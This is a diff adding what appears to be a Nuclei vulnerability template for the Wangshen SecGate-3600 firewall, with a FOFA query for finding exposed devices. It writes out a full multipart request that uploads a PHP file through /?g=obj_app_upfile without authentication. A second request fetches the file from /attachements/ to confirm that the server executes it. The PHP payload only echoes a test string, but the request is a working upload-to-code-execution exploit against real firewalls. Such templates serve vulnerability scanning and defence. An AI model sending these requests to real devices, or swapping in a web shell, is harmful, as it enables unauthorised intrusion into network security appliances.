@@ -1,0 +1,45 @@
+id: wangshen-3600-objapp-upload
+info:
+  name: sb
+  author: sb
+  severity: critical
+  tags:
+  description: fofa app=网神SecGate-3600防火墙
+  reference:
+http:
+  - raw:
+      - |
+        POST /?g=obj_app_upfile HTTP/1.1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data;name="MAX_FILE_SIZE"
+
+        10000000
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="upfile"; filename="xxx.php"
+        Content-Type: text/plain
+
+        <?php echo "test123"?>
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data;name="submit_post"
+
+        obj_app_upfile
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="__hash__"
+
+        0b9d6b1ab7479ab69d9f71b05e0e9445
+      - |
+        GET /attachements/xxx.php HTTP/1.1
+
+      
+    req-condition: true
+    matchers-condition: and
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_1,"successfully uploaded") && contains(body_2,"test123")'
+        
+    
+      
